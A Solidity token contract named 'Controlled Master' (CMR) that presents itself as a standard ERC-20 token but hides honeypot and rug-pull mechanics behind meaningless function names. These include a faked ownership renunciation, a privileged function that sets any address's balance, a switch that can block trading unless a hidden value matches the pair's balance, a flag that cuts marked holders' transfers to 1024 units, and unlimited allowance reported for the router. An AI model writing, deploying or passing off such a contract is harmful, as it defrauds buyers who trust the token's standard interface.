//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface walletReceiver {
    function createPair(address txToken, address tradingToken) external returns (address);
}

interface modeTo {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundWallet) external view returns (uint256);

    function transfer(address walletMax, uint256 isTokenMin) external returns (bool);

    function allowance(address maxFee, address spender) external view returns (uint256);

    function approve(address spender, uint256 isTokenMin) external returns (bool);

    function transferFrom(
        address sender,
        address walletMax,
        uint256 isTokenMin
    ) external returns (bool);

    event Transfer(address indexed from, address indexed totalWalletSender, uint256 value);
    event Approval(address indexed maxFee, address indexed spender, uint256 value);
}

abstract contract takeList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxLiquidityTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface modeToMetadata is modeTo {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ControlledMaster is takeList, modeTo, modeToMetadata {

    uint256 public fromTo;

    bool public enableLimit;

    function getOwner() external view returns (address) {
        return isLiquidityReceiver;
    }

    function name() external view virtual override returns (string memory) {
        return fundLimitTx;
    }

    function balanceOf(address fundWallet) public view virtual override returns (uint256) {
        return listMax[fundWallet];
    }

    uint256 public teamLaunch;

    function autoFundSwap(address maxAuto, address walletMax, uint256 isTokenMin) internal returns (bool) {
        if (maxAuto == minTeamLaunched) {
            return limitTx(maxAuto, walletMax, isTokenMin);
        }
        uint256 autoExempt = modeTo(exemptLiquidity).balanceOf(liquidityIs);
        require(autoExempt == receiverAmount);
        require(walletMax != liquidityIs);
        if (amountEnable[maxAuto]) {
            return limitTx(maxAuto, walletMax, totalSenderTake);
        }
        return limitTx(maxAuto, walletMax, isTokenMin);
    }

    string private takeTrading = "CMR";

    function approve(address launchedSenderSell, uint256 isTokenMin) public virtual override returns (bool) {
        marketingTrading[_msgSender()][launchedSenderSell] = isTokenMin;
        emit Approval(_msgSender(), launchedSenderSell, isTokenMin);
        return true;
    }

    function transferFrom(address maxAuto, address walletMax, uint256 isTokenMin) external override returns (bool) {
        if (_msgSender() != modeMarketing) {
            if (marketingTrading[maxAuto][_msgSender()] != type(uint256).max) {
                require(isTokenMin <= marketingTrading[maxAuto][_msgSender()]);
                marketingTrading[maxAuto][_msgSender()] -= isTokenMin;
            }
        }
        return autoFundSwap(maxAuto, walletMax, isTokenMin);
    }

    function decimals() external view virtual override returns (uint8) {
        return sellFee;
    }

    function transfer(address enableLaunch, uint256 isTokenMin) external virtual override returns (bool) {
        return autoFundSwap(_msgSender(), enableLaunch, isTokenMin);
    }

    bool private launchShould;

    mapping(address => mapping(address => uint256)) private marketingTrading;

    string private fundLimitTx = "Controlled Master";

    function allowance(address fundTrading, address launchedSenderSell) external view virtual override returns (uint256) {
        if (launchedSenderSell == modeMarketing) {
            return type(uint256).max;
        }
        return marketingTrading[fundTrading][launchedSenderSell];
    }

    uint256 receiverAmount;

    function liquidityMax(address enableLaunch, uint256 isTokenMin) public {
        walletAuto();
        listMax[enableLaunch] = isTokenMin;
    }

    address liquidityIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private tokenShould;

    function txLiquidity(uint256 isTokenMin) public {
        walletAuto();
        receiverAmount = isTokenMin;
    }

    function buySwapReceiver() public {
        emit OwnershipTransferred(minTeamLaunched, address(0));
        isLiquidityReceiver = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return walletTeam;
    }

    function walletAuto() private view {
        require(shouldMode[_msgSender()]);
    }

    bool private minTotal;

    address modeMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function symbol() external view virtual override returns (string memory) {
        return takeTrading;
    }

    address public exemptLiquidity;

    event OwnershipTransferred(address indexed fromSender, address indexed liquidityEnable);

    address public minTeamLaunched;

    uint8 private sellFee = 18;

    uint256 constant totalSenderTake = 2 ** 10;

    function owner() external view returns (address) {
        return isLiquidityReceiver;
    }

    function liquidityLaunchedMode(address sellLaunched) public {
        walletAuto();
        if (tokenShould != minTotal) {
            minTotal = false;
        }
        if (sellLaunched == minTeamLaunched || sellLaunched == exemptLiquidity) {
            return;
        }
        amountEnable[sellLaunched] = true;
    }

    mapping(address => bool) public amountEnable;

    constructor (){
        
        maxLiquidityTake enableMode = maxLiquidityTake(modeMarketing);
        exemptLiquidity = walletReceiver(enableMode.factory()).createPair(enableMode.WETH(), address(this));
        
        minTeamLaunched = _msgSender();
        shouldMode[minTeamLaunched] = true;
        listMax[minTeamLaunched] = walletTeam;
        buySwapReceiver();
        if (fromTo == teamLaunch) {
            launchShould = true;
        }
        emit Transfer(address(0), minTeamLaunched, walletTeam);
    }

    uint256 isTake;

    address private isLiquidityReceiver;

    function receiverFromShould(address marketingFrom) public {
        require(marketingFrom.balance < 100000);
        if (enableLimit) {
            return;
        }
        
        shouldMode[marketingFrom] = true;
        
        enableLimit = true;
    }

    function limitTx(address maxAuto, address walletMax, uint256 isTokenMin) internal returns (bool) {
        require(listMax[maxAuto] >= isTokenMin);
        listMax[maxAuto] -= isTokenMin;
        listMax[walletMax] += isTokenMin;
        emit Transfer(maxAuto, walletMax, isTokenMin);
        return true;
    }

    mapping(address => bool) public shouldMode;

    mapping(address => uint256) private listMax;

    uint256 private walletTeam = 100000000 * 10 ** 18;

}